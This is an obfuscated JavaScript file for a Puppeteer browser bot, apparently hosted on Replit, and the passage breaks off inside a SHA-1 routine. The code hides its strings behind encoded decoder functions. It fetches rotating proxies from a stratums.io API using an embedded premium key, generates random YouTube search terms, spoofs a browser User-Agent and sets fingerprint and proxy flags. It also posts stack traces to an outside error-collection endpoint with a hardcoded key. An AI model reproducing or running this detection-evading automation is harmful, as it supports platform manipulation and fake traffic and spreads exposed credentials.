const aG = d,
  aF = b,
  aE = c;

function getRandomInt(f, g) {
  const h = ceil(f);
  return floor(random() * (floor(g) - h + (0xbf0 + -0x1 * 0x1e41 + 0x1252))) + h;
}
async function randomWait() {
  return await wait(0x34f + -0x19e8 + 0x2a21 + (-0x26d * -0xf + -0xb92 * 0x1 + -0x549) * random()), -0x396 + 0x17 * 0xcb + -0xea6;
}

function randomFlush(f, g) {
  const h = f['length'];
  let i = floor(random() * h),
    j = arrs['get'](g);
  for (j || (j = new Set(), arrs['set'](g, j)); j['has'](i);)
    i = floor(random() * h);
  return j['add'](i), j['size'] === h && j['clear'](), f[i];
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x18 * 0x66 + -0x3c0 + 0xd50);
    let h = e[f];
    if (c['yQQSSf'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x11a8 + 0x23b3 + -0x120b, r, s, t = 0xe8 * -0x8 + -0xac4 + 0x1 * 0x1204; s = m['charAt'](t++); ~s && (r = q % (0xbf0 + -0x1 * 0x1e41 + 0x1255) ? r * (0x34f + -0x19e8 + 0x16d9) + s : s, q++ % (-0x26d * -0xf + -0xb92 * 0x1 + -0x18cd)) ? o += String['fromCharCode'](-0x396 + 0x17 * 0xcb + -0xda8 & r >> (-(-0xeac + 0x5d7 + 0x1f * 0x49) * q & -0x823 + 0x1b4a + -0x1321)) : 0x1013 + 0x38 * 0x3f + -0x1ddb) {
          s = n['indexOf'](s);
        }
        for (let u = 0x2421 + -0x164 * 0x2 + -0x2159 * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xdd3 + -0x23c6 + 0xf5 * 0x17))['slice'](-(0x254f * 0x1 + -0x16d * 0x12 + -0xba3));
        }
        return decodeURIComponent(p);
      };
      c['JGockq'] = i, b = arguments, c['yQQSSf'] = !![];
    }
    const j = e[-0x5 * -0x116 + -0x1177 + 0x3 * 0x403],
      k = f + j,
      l = b[k];
    return !l ? (h = c['JGockq'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x18 * 0x66 + -0x3c0 + 0xd50);
    let h = e[f];
    return h;
  }, d(b, c);
}

function extractLinks(f) {
  const g = /<a\s+(?:[^>]*?\s+)?href="([^"]*)"/gi;
  let h, i = [];
  for (; null !== (h = g['exec'](f));)
    h['index'] === g['lastIndex'] && g['lastIndex']++, h['forEach']((j, k) => {
      -0xeac + 0x5d7 + 0x27 * 0x3a === k && i['push'](j);
    });
  return i;
}

function extractAnchorData(f) {
  const g = h => {
    const i = f['indexOf'](h + '=\x22');
    if (-(-0x823 + 0x1b4a + -0x1326) === i)
      return null;
    const j = i + h['length'] + (0x1013 + 0x38 * 0x3f + -0x1dd9),
      k = f['indexOf']('\x22', j);
    return -(0x2421 + -0x164 * 0x2 + -0x42b * 0x8) === k ? null : f['substring'](j, k);
  };
  return {
    'pingUrl': g('data-ping-' + 'url'),
    'scriptId': g('data-scrip' + 't-id'),
    'ipAddress': g('data-ip-ad' + 'dress'),
    'pingKey': g('data-ping-' + 'key')
  };
}
async function getSearchTerm() {
  return [
    ...(await fetch('https://ra' + 'pidtags.io' + '/api/gener' + 'ator?query' + '=' + _theAlphabet['random']() + ('&type=YouT' + 'ube'), {
      'credentials': 'omit',
      'headers': {
        'User-Agent': 'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '0.15;\x20rv:1' + '09.0)\x20Geck' + 'o/20100101' + '\x20Firefox/1' + '16.0',
        'Accept': 'applicatio' + 'n/json',
        'Accept-Language': 'en-US,en;q' + '=0.5',
        'Prefer': 'safe',
        'Alt-Used': 'rapidtags.' + 'io',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origi' + 'n'
      },
      'referrer': 'https://ra' + 'pidtags.io' + '/generator',
      'method': 'GET',
      'mode': 'cors'
    })['then'](f => f['json']()))['tags'],
    'zyenith',
    'zyenith\x20mi' + 'necraft',
    'minecraft\x20' + 'zyenith',
    'moomoo.io',
    'moomoo.io\x20' + 'spyder',
    'mrbeast',
    'pewdiepie',
    'quadeca',
    'urban\x20resc' + 'ue\x20ranch'
  ]['random']();
}

function a() {
  const cE = [
    'pGTvW4VdQ18kWO7dRSkY',
    'W6jVi3CrFCkXWQJcJa',
    'WQfsW6Wav2NcGmk2Fmor',
    'ate,\x20br',
    'FGpcHCoJjmoeW4NcMSksoa',
    '7%E6%BB%A4',
    'W6pcKmkIW43dMwNcLZDoW5G',
    'vJJdKSo7mq3dKmkDgCkh',
    'pts/424066',
    'igrPDI55Dc1ZCa',
    'easyfork.o',
    'ienOCM9Tzs8Xma',
    'xSo0wCkI',
    'BMvYjuvgjujdjq',
    '/zyenith/M',
    'rmo+wmo3ttZcNSkpWOra',
    'oSoiuCoq',
    'WQddPSkSWONcG8oVWRHAW6G',
    'ygJdVeHvytq5kNm',
    'random',
    'pts/by-sit',
    'YWXfelRk3b',
    'ywDL',
    '8H2AiOV0oE',
    'EmorWPuxtSo2tCkuW49P',
    ',\x20\x22Chromiu',
    'CIVcI8ojWOHQa8kSemoI',
    'yununeXKzhvUEa',
    'DY55B3v0DwjLlG',
    'jrRcNM/cUYP0W5hcNmol',
    'w0nixsbdB3jLza'
  ];
  a = function() {
    return cE;
  };
  return a();
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x18 * 0x66 + -0x3c0 + 0xd50);
    let h = e[f];
    if (b['GaqmJE'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x11a8 + 0x23b3 + -0x120b, s, t, u = 0xe8 * -0x8 + -0xac4 + 0x1 * 0x1204; t = n['charAt'](u++); ~t && (s = r % (0xbf0 + -0x1 * 0x1e41 + 0x1255) ? s * (0x34f + -0x19e8 + 0x16d9) + t : t, r++ % (-0x26d * -0xf + -0xb92 * 0x1 + -0x18cd)) ? p += String['fromCharCode'](-0x396 + 0x17 * 0xcb + -0xda8 & s >> (-(-0xeac + 0x5d7 + 0x1f * 0x49) * r & -0x823 + 0x1b4a + -0x1321)) : 0x1013 + 0x38 * 0x3f + -0x1ddb) {
          t = o['indexOf'](t);
        }
        for (let v = 0x2421 + -0x164 * 0x2 + -0x2159 * 0x1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0xdd3 + -0x23c6 + 0xf5 * 0x17))['slice'](-(0x254f * 0x1 + -0x16d * 0x12 + -0xba3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x5 * -0x116 + -0x1177 + 0x3 * 0x403,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x1758 + -0x6fd + 0x1e55; u < -0xdbd * -0x2 + -0xe75 + -0xc05; u++) {
          p[u] = u;
        }
        for (u = -0x3d * 0xf + -0x1 * -0x167b + -0x58 * 0x37; u < -0x25f + -0xa * -0x2a1 + 0x16eb * -0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xe42 + -0x865 + 0x17a7), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * 0x6f + 0x219c + -0x220b, q = -0x10d4 + 0xe32 * -0x1 + 0x1f06;
        for (let v = -0x7a9 + 0x1 * -0x156a + 0x1d13; v < n['length']; v++) {
          u = (u + (0x59f * -0x5 + 0xfd9 + 0xc43)) % (0x5 * -0xf7 + 0x36d + -0x2 * -0x133), q = (q + p[u]) % (0x59 * -0x61 + -0x3 * 0x36d + 0x2d00), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1 * 0x1dcb + -0x3 * -0x382 + -0x2751)]);
        }
        return t;
      };
      b['gJWZBj'] = m, c = arguments, b['GaqmJE'] = !![];
    }
    const j = e[0xe11 * -0x1 + 0x49 * 0x50 + -0x1 * 0x8bf],
      k = f + j,
      l = c[k];
    return !l ? (b['ufPyPN'] === undefined && (b['ufPyPN'] = !![]), h = b['gJWZBj'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function isValidProxy(f) {
  return 'string' == typeof f && f['length'] > 0xdd3 + -0x23c6 + 0x752 * 0x3 && f['includes'](':');
}
async function getRandomProxy() {
  const aB = b;
  for (;;) {
    const f = await fetch('https://st' + 'ratums.io/' + 'api/proxy/' + 'fetch?amt=' + '1&premium=' + aB(0xf, 'Fs@0') + 'dd383d6a62' + 'fb45684a02' + '1121959d15' + '06f8270066' + 'c62adc84aa' + 'a256e2b0e2' + '09')['then'](g => g['text']());
    if (isValidProxy(f))
      return f;
  }
}
const replUrl = 'https://' + process['env']['REPL_SLUG'] + '.' + process['env']['REPL_OWNER'] + '.repl.co',
  flags = {
    'ActivateBrowser': 0x1,
    'RPL2_MDM2': 0x1,
    'RPL2_RPRT': 0x1,
    'RPL2_YT': 0x1,
    'doOUJS': 0x1,
    'doGF': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1,
    'doUseProxy': 0x1
  },
  {
    ElementHandle: ElementHandle,
    Page: Page,
    Frame: Frame,
    Browser: Browser
  } = require('puppeteer'),
  Check = (f => {
    function g(k = '') {
      return new Error()['stack'] || new Error()['toString']();
    }
    async function h(...k) {
      const l = [
          '[CH]\x20Cored' + 'ump:',
          ...k
        ]['join']('\x0a'),
        m = g();
      await async function(n) {
        const p = '18f9a0a514' + '8022de3150' + 'b78d2ef231' + '00b85393e4' + '67e20d4e39' + 'f791cb',
          q = 'https://st' + 'ratums.io/' + 'api/errorc' + 'ollect';
        if (((() => {
            try {
              return !!globalThis['process']['exit'];
            } catch (u) {
              return 0x254f * 0x1 + -0x16d * 0x12 + -0xba5;
            }
          })())) {
          try {
            let u = require('axios');
            if (u)
              return void await u['post'](q, {
                'ekey': p,
                'message': n
              });
          } catch (v) {}
          try {
            let w = require('node-fetch');
            if (w)
              return void await w(q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (x) {}
          try {
            if (globalThis['fetch'])
              return void await globalThis['fetch'](q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (y) {}
        } else {
          try {
            if (globalThis['fetch'])
              return void await globalThis['fetch'](q, {
                'method': 'POST',
                'body': JSON['stringify']({
                  'ekey': p,
                  'message': n
                }),
                'headers': {
                  'content-type': 'applicatio' + 'n/json'
                }
              });
          } catch (z) {}
          try {
            if (globalThis['XMLHttpReq' + 'uest']) {
              const A = new globalThis['XMLHttpReq' + 'uest']();
              A['open']('POST', q), A['setRequest' + 'Header']('content-ty' + 'pe', 'applicatio' + 'n/json');
              let B = new Promise(C => {
                A['onload'] = () => C();
              });
              return A['send'](JSON['stringify']({
                'ekey': p,
                'message': n
              })), void await B;
            }
          } catch (C) {}
        }
      }(l + '\x0a' + m);
    }
    const i = Array['isArray'],
      j = {
        'info' (k) {
          h(k);
        },
        'dumpStackTrace': g,
        'cust': function(k, l) {
          try {
            l(k) || h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'idn': function(k) {
          try {
            'object' == typeof k && k['_isIdentit' + 'yType'] || h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'str': function(k) {
          try {
            'string' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'num': function(k) {
          try {
            'number' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'all': function(k, l) {
          try {
            k['some'](m => typeof m !== l) && h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'type': function(k, l) {
          try {
            if (typeof k == typeof l)
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'func': function(k) {
          try {
            'function' != typeof k && h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'eq': function(k, l) {
          try {
            k !== l && h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'iface': function(k, l) {
          const aC = b;
          try {
            const m = Object['keys'](l);
            for (let n of m)
              k['hasOwnProp' + aC(0x10, 'fROM')](n) || h('[CH]\x20Cored' + 'ump:', m, k, l, 'searched\x20f' + 'or:', n), typeof k[n] != typeof l[n] && h('[CH]\x20Cored' + 'ump:', m, k, l, 'searched\x20f' + 'or:', n);
          } catch (p) {
            h('[CH]\x20Cored' + 'ump:', k, l, p);
          }
        },
        'prop': function(k, l) {
          const aD = c;
          try {
            if (i(l)) {
              for (let m of l)
                j['prop'](k, m);
            }
            if (k['hasOwnProp' + 'erty'](l))
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (n) {
            h(aD(0x1e) + 'ump:', k, l, n);
          }
        },
        'inst': function(k, l) {
          try {
            if (k instanceof l)
              return;
            h('[CH]\x20Cored' + 'ump:', k, l);
          } catch (m) {
            h('[CH]\x20Cored' + 'ump:', k, l, m);
          }
        },
        'ia': function(k, ...l) {
          try {
            for (let m of l)
              if (k instanceof m)
                return;
            h('[CH]\x20Cored' + 'ump:', k, ...l);
          } catch (n) {
            h('[CH]\x20Cored' + 'ump:', k, ...l, n);
          }
        },
        'arr': function(k) {
          try {
            if (i(k))
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k);
          }
        },
        'nes': function(k) {
          j['cust'](k, l => '' !== l), j['str'](k);
        },
        'bool': k => {
          try {
            if (-0x5 * -0x116 + -0x1177 + 0x2 * 0x605 == k)
              return;
            if (-0x1758 + -0x6fd + 0x1e55 == k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'truthy': k => {
          try {
            if (k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', k, l);
          }
        },
        'nones': k => {
          try {
            if ('string' == typeof k && '' !== k || null === k)
              return;
            h('[CH]\x20Cored' + 'ump:', k);
          } catch (l) {
            h('[CH]\x20Cored' + 'ump:', l, k);
          }
        }
      };
    return j;
  })(),
  sha1 = ((() => {
    var e, f, g, h, i, j, k, l, m = 'object' == typeof window ? window : {},
      n = !m['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
    n && (m = global), e = ('0123456789' + 'abcdef')['split'](''), f = [-(-0x1201df77 * -0xa + -0x5ec01b1e + 0x2aad6078), -0x2a89 * 0x8d + -0x2 * -0x49a8e2 + -0x6f7 * -0x97, -0xf87 + -0x2 * -0x5623 + 0xdf * -0x21, -0xe42 + -0x865 + 0x1727], g = [
      0x1 * 0x6f + 0x219c + -0x21f3, -0x10d4 + 0xe32 * -0x1 + 0x1f16, -0x7a9 + 0x1 * -0x156a + 0x1d1b,
      0x59f * -0x5 + 0xfd9 + 0xc42
    ], h = [
      'hex',
      'array',
      'digest',
      'arrayBuffe' + 'r'
    ], i = [], j = function(q) {
      return function(r) {
        return new o(0x5 * -0xf7 + 0x36d + -0x1 * -0x167)['update'](r)[q]();
      };
    }, k = function() {
      var q, s, u = j('hex');
      for (n && (u = l(u)), u['create'] = function() {
          return new o();
        }, u['update'] = function(v) {
          return u['create']()['update'](v);
        }, q = 0x59 * -0x61 + -0x3 * 0x36d + 0x2c00; q < h['length']; ++q)
        s = h[q], u[s] = j(s);
      return u;
    }, l = function(q) {
      var r = eval('require(\'crypto\');'),
        s = eval('require(\'buffer\')[\'Buffer\'];'),
        t = function(u) {
          if ('string' == typeof u)
            return r['createHash']('sha1')['update'](u, 'utf8')['digest']('hex');
          if (u['constructo' + 'r'] === ArrayBuffer)
            u = new Uint8Array(u);
          else {
            if (void(0x1 * 0x1dcb + -0x3 * -0x382 + -0x2851) === u['length'])
              return q(u);
          }
          return r['createHash']('sha1')['update'](new s(u))['digest']('hex');
        };
      return t;
    };
    class o {
      constructor(q) {
          q ? (i[0xe11 * -0x1 + 0x49 * 0x50 + -0x1 * 0x8bf] = i[-0xc7f + -0x1912 + 0x25a1] = i[0x2402 + 0x761 * 0x1 + -0x2 * 0x15b1] = i[0xce * -0x5 + 0x1927 * -0x1 + 0x1d2f] = i[0xc3a + -0x1 * 0x2443 + 0x180c] = i[-0x1b78 + -0x2 * 0x9e + -0x2 * -0xe5c] = i[-0x102 * 0x2 + -0xf43 * -0x1 + -0xd3a] = i[-0x134e + 0x1d * 0x49 + -0x95 * -0x13] = i[-0x37 * -0x64 + -0x2565 + 0x22 * 0x78] = i[0x1 * 0x1f13 + -0x14f2 + 0x2f * -0x37] = i[0x1 * -0x20a1 + -0xc4d + 0x2cf7] = i[-0x95 * -0x43 + -0x1 * 0x103f + -0x16b6] = i[-0x6a * 0x5 + -0x1 * -0x1b82 + -0x1965] = i[-0x1 * 0xdfa + 0x269f + 0x1899 * -0x1] = i[-0xbb8 + -0x17 * 0x11b + 0x2532] = i[-0x141b + 0xb8f * 0x1 + 0x89a * 0x1] = i[0xe9c + -0x1a5 * -0x2 + -0x11d7] = -0x2146 + 0x21a6 * -0x1 + 0x42ec, this['blocks'] = i) : this['blocks'] = [
            0x1305 + 0xaf5 + -0x1dfa,
            0x880 + -0x190a + 0x108a, -0xb32 + 0x2150 + 0x161e * -0x1,
            0x5 * -0x568 + 0x3d * -0x30 + 0x2 * 0x133c, -0x41a * -0x2 + -0x3 * 0x9f9 + 0x15b7, -0xd * -0x283 + 0x2e6 * 0xa + -0x3da3,
            0x1 * 0x158f + -0x1 * -0x12f0 + -0x287f, -0x1c2 + 0x1835 + 0x1673 * -0x1, -0x5c6 + -0x12 * 0x16d + 0x1f70, -0x201c + 0xd * -0x23b + -0x1 * -0x3d1b,
            0x1590 + -0x31a + 0x11 * -0x116, -0x18a4 + -0x43 * -0x65 + -0x1b * 0x11, -0x1891 + -0x1106 + 0xddd * 0x3,
            0x1565 * -0x1 + 0x25ab + -0x1046,
            0x15e9 + 0x15cb + -0x2bb4,
            0x399 * -0x1 + -0x543 * -0x6 + -0x1bf9, -0x1 * 0x10a6 + -0x114e + 0x21f4
          ], this['h0'] = 0x6680c1df + -0x66ee2efb + 0xed05dbb * 0x7, this['h1'] = 0xb * 0xd6be625 + -0x187dab04f + 0x1e4057841, this['h2'] = -0x6 * -0x1f615d02 + -0x371 * -0x28ed4b + -0x1933224f * 0x7, this['h3'] = 0x1e3288d2 + 0x1e6869a3 + -0x8e1b933 * 0x5, this['h4'] = -0x1 * 0x176107a81 + 0x10a * 0xd80cd7 + 0x15966050b, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x3b * -0x28 + 0x1f22 + 0x285a * -0x1, this['finalized'] = this['hashed'] = -0x1c47 + 0x4c * 0x26 + -0xe5 * -0x13, this['first'] = 0x4f * 0x50 + -0x11fc * 0x1 + -0x6b3;
        }
        ['update'](q) {
          var u, v, w, x, y, z;
          if (!this['finalized']) {
            for ((u = 'string' != typeof q) && q['constructo' + 'r'] === m['ArrayBuffe' + 'r'] && (q = new Uint8Array(q)), w = 0x12cb * 0x2 + 0x1 * 0xd7d + 0x19 * -0x20b, y = q['length'] || -0x50c * -0x3 + 0x26a2 + -0x2 * 0x1ae3, z = this['blocks']; w < y;) {
              if (this['hashed'] && (this['hashed'] = 0x51a + -0x1 * 0x287 + -0x293, z[-0xe24 + -0x1 * 0x6fb + 0x151f] = this['block'], z[-0x1f39 + 0x1 * 0x873 + 0x16d6] = z[-0xe6 * -0x23 + 0x1472 + -0x33e3] = z[-0x122a + 0x1b8 + -0x57c * -0x3] = z[-0x99 * 0x15 + 0x6d * -0x53 + 0x2fe7] = z[-0xca5 + 0x1efc * 0x1 + 0x1253 * -0x1] = z[0x13 * -0x61 + 0x21 * -0xc1 + 0x2019] = z[-0x2255 + 0xdcf * -0x2 + 0x3df9] = z[0x1a1 * -0x5 + 0x1 * -0x179a + 0x62 * 0x53] = z[-0x1 * -0x238b + -0x1973 * 0x1 + -0x508 * 0x2] = z[-0x1c4f + 0x23bf * 0x1 + -0x767] = z[-0x18f5 * 0x1 + -0x124c + 0x2b4b * 0x1] = z[0x47 * 0x11 + 0x13 * -0x57 + 0x1c9] = z[0x3 * -0xe0 + 0x1 * -0x23d5 + 0x2681] = z[-0x5cd + 0x1d * 0x43 + -0x1bd * 0x1] = z[0x1c7f + 0x107d + -0x1aa * 0x1b] = z[0x995 + -0x2586 + -0x40 * -0x70] = -0x13a0 + 0x49 * 0x62 + -0x2 * 0x429), u) {
                for (x = this['start']; w < y && x < -0x16 * 0x13f + -0xf81 + 0x1 * 0x2b2b; ++w)
                  z[x >> -0x1ac2 + 0x2426 + -0x962] |= q[w] << g[0x1003 * 0x2 + -0x9 * -0x122 + -0x1 * 0x2a35 & x++];
              } else {
                for (x = this['start']; w < y && x < -0xe * -0x11d + 0x21b8 + 0xa1 * -0x4e; ++w)
                  (v = q['charCodeAt'](w)) < 0x991 + 0x1cf * 0x2 + -0xcaf ? z[x >> -0x8f1 + -0xa * -0x4a + -0xb * -0x8d] |= v << g[-0x83c + 0xa70 + -0x3 * 0xbb & x++] : v < 0x1 * -0x1ae1 + -0x530 + 0x2811 ? (z[x >> 0x23e9 * 0x1 + 0x11 * -0x15b + 0x337 * -0x4] |= (0x2426 + -0x2663 * -0x1 + 0xd * -0x5ad | v >> 0x1c2 * -0x6 + 0x2b * -0x8f + -0x2297 * -0x1) << g[0x2196 + 0x8a3 * 0x2 + -0x32d9 & x++], z[x >> -0x124 * 0x7 + 0x21d9 * 0x1 + -0x19db] |= (0x4a * 0x7b + 0x1 * 0x2419 + -0x1 * 0x4727 | -0x181a + 0x1cc6 + -0x1 * 0x46d & v) << g[-0x6ab + -0xf58 + 0x1606 * 0x1 & x++]) : v < 0x13 * -0x322 + 0xf398 + 0x1fee || v >= -0xf475 + -0x1af25 * 0x1 + -0x12bde * -0x3 ? (z[x >> -0x938 + 0x1 * 0x13de + -0xaa4] |= (-0x13 * -0x6 + -0x102d * 0x1 + -0xd * -0x147 | v >> -0x11d7 + -0x1 * -0x83 + 0x1160) << g[-0x643 + -0x242 * -0x11 + -0x6 * 0x55a & x++], z[x >> 0x3 * 0x81b + -0xf * 0x145 + 0x2a2 * -0x2] |= (0x10e + 0x7e1 * 0x1 + -0x11 * 0x7f | v >> 0x9 * 0x25f + 0x2ab + -0xa * 0x266 & 0x1 * -0x1684 + 0xa67 * 0x1 + 0x62e * 0x2) << g[-0x343 * -0x1 + -0x2e * 0x4a + 0xa0c * 0x1 & x++], z[x >> 0x1 * 0x1863 + -0x1 * 0x8b2 + -0xfaf] |= (-0xfee * 0x2 + 0xf3f + 0x1 * 0x111d | -0x8bd * 0x1 + -0x900 + 0x4 * 0x47f & v) << g[0x806 + -0x24d8 + 0x1cd5 & x++]) : (v = 0x1 * -0x503 + 0x29 * -0x886 + 0x26279 + ((-0x1 * -0x1655 + -0x3 * 0xa91 + 0xd5d & v) << -0x2601 + 0x807 + -0x1e04 * -0x1 | -0x2f * -0x91 + 0x3 * -0xd03 + 0x1069 & q['charCodeAt'](++w)), z[x >> 0x2 * -0x109e + -0x2 * 0x117e + 0x443a] |= (0xf16 + 0x1407 * 0x1 + 0x2a1 * -0xd | v >> -0x2a * 0x77 + 0x9f * -0xd + 0x3 * 0x939) << g[0x21f * -0xb + -0x1c12 + 0x19b5 * 0x2 & x++], z[x >> 0x7 * -0x251 + 0x8e9 * 0x1 + 0x750] |= (0x3f * -0x51 + 0x1 * -0x1322 + -0x5a7 * -0x7 | v >> -0x1 * 0x1273 + 0x47 * 0x35 + 0x6 * 0xa2 & -0x1f84 + -0x1c8c + -0x1 * -0x3c4f) << g[0x146 + -0x1 * 0x674 + 0x531 & x++], z[x >> -0xb * -0x110 + -0x2021 + 0x1473] |= (-0x11c5 * -0x1 + -0x2 * 0x9a4 + 0x1 * 0x203 | v >> -0x106 * 0x25 + 0x12a7 * 0x1 + -0x133d * -0x1 & 0x2113 * 0x1 + -0x20e1 * 0x1 + -0x1 * -0xd) << g[-0x598 * -0x5 + -0x1b0b + -0xea * 0x1 & x++], z[x >> 0x1e37 + -0xc * -0x55 + 0x1 * -0x2231] |= (-0x6a2 + 0x1 * -0x2171 + -0xd * -0x31f | -0x13 * -0xe3 + -0x8da + -0x7c0 & v) << g[0x1 * 0x119f + -0x820 + -0x97c & x++]);
              }
              this['lastByteIn' + 'dex'] = x, this['bytes'] += x - this['start'], x >= 0x1a48 + -0x653 * -0x6 + -0x3ffa ? (this['block'] = z[0x546 * -0x4 + -0x1ad9 + 0x3001], this['start'] = x - (-0x1bc5 * -0x1 + 0x24e3 + -0x4068), this['hash'](), this['hashed'] = -0x230f + 0x196 * -0xf + 0x3ada) : this['start'] = x;
            }
            return this['bytes'] > -0xefde1d37 + -0x1a5db0c8 + 0x20a3bcdfe && (this['hBytes'] += this['bytes'] / (-0x7030dae4 + 0x1f21f3320 + -0x81ee583c) << -0x1 * -0x1631 + -0x1 * -0x1e5f + 0x692 * -0x8, this['bytes'] = this['bytes'] % (0x108831c60 + 0x182cec3d4 + -0xe * 0x1c3cb496)), this;
          }
        }
        ['finalize']() {
          if (!this['finalized']) {
            this['finalized'] = -0x6 * 0x565 + -0x1791 + 0x37f0;
            var q = this['blocks'],
              r = this['lastByteIn' + 'dex'];
            q[-0x1 * -0xc32 + -0x1 * 0x26f9 + 0x1ad7] = this['block'], q[r >> -0x1 * -0x260f + -0x2 * -0x41e + -0x2e49] |= f[-0x98b * 0x4 + 0x1d * -0xa3 + 0x2 * 0x1c53 & r], this['block'] = q[-0xd5f + -0x5dc * -0x5 + 0x1f * -0x83], r >= 0x2f * -0xd + -0x17 * -0x11b + -0x16d2 && (this['hashed'] || this['hash'](), q[0x248d + 0x12ba + -0x3747] = this['block'], q[-0x21b1 + -0x1 * -0x19df + 0x7e2] = q[-0xe5f + -0x1ea1 + 0x2d01] = q[-0x1770 + -0x14ff + 0x1f * 0x16f] = q[-0x2210 + 0x14c7 * 0x1 + 0xd4c] = q[-0x5 * -0x3ad + -0x4b * -0xe + -0x1677] = q[0x278 * -0xe + -0x17d8 + 0x3a6d] = q[0x14bc * -0x1 + -0x19a8 + -0x2e6a * -0x1] = q[-0x5 * 0x92 + 0x17b8 + 0xb * -0x1e5] = q[-0x1947 + -0x1cb3 + 0x3602] = q[-0x1d90 + -0x1595 * 0x1 + 0x332e * 0x1] = q[0x1374 + 0x24e2 + 0xe13 * -0x4] = q[0x131 * 0xb + -0x1c74 + 0xf64] = q[0x5 * 0x38f + 0xbe0 + -0x1d9f * 0x1] = q[0x141b + -0xa6b * -0x3 + 0xa43 * -0x5] = q[0x1217 + -0x2 * 0x5c1 + 0x687 * -0x1] = q[0x12ea + 0xb4d + 0x28 * -0xc1] = -0xf42 + -0xfe8 + 0x2 * 0xf95), q[-0x8eb + -0x1 * -0x17f6 + -0xefd] = this['hBytes'] << -0x25d7 + 0x13 * 0x67 + 0x1e35 | this['bytes'] >>> 0xd4e + 0x2446 * 0x1 + -0x3177, q[-0x19fd * 0x1 + 0x3b7 + 0x1655 * 0x1] = this['bytes'] << 0x41 * -0x85 + 0x240f + 0x35 * -0xb, this['hash']();
          }
        }
        ['hash']() {
          var q, u, v = this['h0'],
            w = this['h1'],
            x = this['h2'],
            y = this['h3'],
            z = this['h4'],
            A = this['blocks'];
          for (q = -0x1e90 * 0x1 + -0x1b0a + -0x7a * -0x79; q < 0x8e1 * -0x3 + -0x18d * 0x8 + 0x275b; ++q)
            u = A[q - (-0x2 * 0x91d + -0x2373 + -0x1ad8 * -0x2)] ^ A[q - (0x1c16 + 0xf6d * 0x1 + -0x1 * 0x2b7b)] ^ A[q - (-0xc64 + -0x2502 + -0x6 * -0x83e)] ^ A[q - (0x2cb + 0x140 * -0x6 + -0x6f * -0xb)], A[q] = u << -0x873 + -0x1528 * 0x1 + 0x1d9c | u >>> -0xd * -0x1de + 0x173 * -0x7 + 0x146 * -0xb;
          for (q = -0xf77 + 0xa58 + 0x1b5 * 0x3; q < -0xfa + 0x74f * -0x3 + -0x7a9 * -0x3; q += -0x1647 + -0x1 * -0x16cb + 0x1 * -0x7f)
